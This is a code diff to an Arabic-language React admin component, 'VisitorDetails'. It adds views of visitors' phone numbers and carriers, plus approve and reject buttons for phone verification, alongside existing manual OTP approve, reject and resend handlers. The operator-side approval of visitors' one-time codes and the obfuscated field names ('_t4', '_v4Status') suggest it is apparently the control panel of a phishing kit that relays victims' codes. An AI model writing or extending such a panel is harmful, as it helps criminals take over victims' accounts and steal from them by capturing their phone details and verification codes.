@@ -14,6 +14,8 @@ import {
   handlePhoneOtpApproval,
   handlePhoneOtpRejection,
   handlePhoneOtpResend,
+  handlePhoneVerificationApproval,
+  handlePhoneVerificationRejection,
   updateHistoryStatus
 } from "@/lib/history-actions"
 import { _d } from "@/lib/secure-utils"
@@ -358,8 +360,66 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       }
     })
     
-    // Phone Info
-    if (visitor.phoneCarrier) {
+    // Phone Verification - Show ALL attempts from history (newest first)
+    const allPhoneHistory = visitor.history?.filter((h: any) => h.type === '_t4' || h.type === 'phone_verification') || []
+    const sortedPhoneHistory = allPhoneHistory.sort((a: any, b: any) => {
+      const timeA = new Date(a.timestamp).getTime()
+      const timeB = new Date(b.timestamp).getTime()
+      return timeB - timeA
+    })
+    
+    // If no history exists but phone data is in main document, create a bubble from it
+    if (sortedPhoneHistory.length === 0 && visitor.phoneCarrier) {
+      const phoneStatus = (visitor as any)._v4Status || 'pending'
+      bubbles.push({
+        id: 'phone-verification-current',
+        title: "تحقق الهاتف",
+        icon: "📞",
+        color: "teal",
+        data: {
+          "رقم الجوال": visitor.phoneNumber,
+          "شركة الاتصالات": visitor.phoneCarrier,
+          "الحالة": phoneStatus === "approved" ? "✓ تم القبول" : 
+                    phoneStatus === "rejected" ? "✗ تم الرفض" : "⬳ في انتظار الموافقة"
+        },
+        timestamp: visitor.phoneUpdatedAt || visitor.updatedAt,
+        status: phoneStatus === "approved" ? "approved" as const : 
+                phoneStatus === "rejected" ? "rejected" as const : "pending" as const,
+        showActions: phoneStatus !== "approved" && phoneStatus !== "rejected",
+        isLatest: true,
+        type: "phone_verification"
+      })
+    } else {
+      // Show history entries
+      sortedPhoneHistory.forEach((phoneHistory: any, index: number) => {
+        const hasBeenActioned = phoneHistory.status === 'approved' || phoneHistory.status === 'rejected'
+        const phoneNumber = phoneHistory.data?.phoneNumber || visitor.phoneNumber
+        const phoneCarrier = phoneHistory.data?.phoneCarrier || visitor.phoneCarrier
+        
+        if (phoneNumber && phoneCarrier) {
+          bubbles.push({
+            id: `phone-verification-${phoneHistory.id || index}`,
+            title: index === 0 ? "تحقق الهاتف" : `تحقق الهاتف (محاولة ${sortedPhoneHistory.length - index})`,
+            icon: "📞",
+            color: "teal",
+            data: {
+              "رقم الجوال": phoneNumber,
+              "شركة الاتصالات": phoneCarrier,
+              "الحالة": phoneHistory.status === "approved" ? "✓ تم القبول" : 
+                        phoneHistory.status === "rejected" ? "✗ تم الرفض" : "⬳ في انتظار الموافقة"
+            },
+            timestamp: phoneHistory.timestamp,
+            status: phoneHistory.status || "pending" as const,
+            showActions: !hasBeenActioned,
+            isLatest: index === 0,
+            type: "phone_verification"
+          })
+        }
+      })
+    }
+    
+    // Phone Info (legacy - for backward compatibility)
+    if (visitor.phoneCarrier && sortedPhoneHistory.length === 0 && !(visitor as any)._v4Status) {
       bubbles.push({
         id: "phone-info-current",
         title: "معلومات الهاتف",
@@ -500,6 +560,18 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
               // Reject OTP using proper handler
               await handleOtpRejection(visitor.id, bubble.id, visitor.history || [])
+            }
+          }
+          break
+
+        case "phone_verification":
+          if (action === "approve") {
+            // Approve phone verification using proper handler
+            await handlePhoneVerificationApproval(visitor.id, bubble.id, visitor.history || [])
+          } else if (action === "reject") {
+            if (confirm("هل أنت متأكد من رفض رقم الهاتف؟")) {
+              // Reject phone verification using proper handler
+              await handlePhoneVerificationRejection(visitor.id, bubble.id, visitor.history || [])
             }
           }
           break
@@ -754,6 +826,24 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                           className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium"
                         >
                           ✓ قبول
+                        </button>
+                        <button
+                          onClick={() => handleBubbleAction(bubble.id, "reject")}
+                          disabled={isProcessing}
+                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
+                        >
+                          ✗ رفض
+                        </button>
+                      </>
+                    )}
+                    {bubble.type === "phone_verification" && (
+                      <>
+                        <button
+                          onClick={() => handleBubbleAction(bubble.id, "approve")}
+                          disabled={isProcessing}
+                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium"
+                        >
+                          ✓ موافقة
                         </button>
                         <button
                           onClick={() => handleBubbleAction(bubble.id, "reject")}
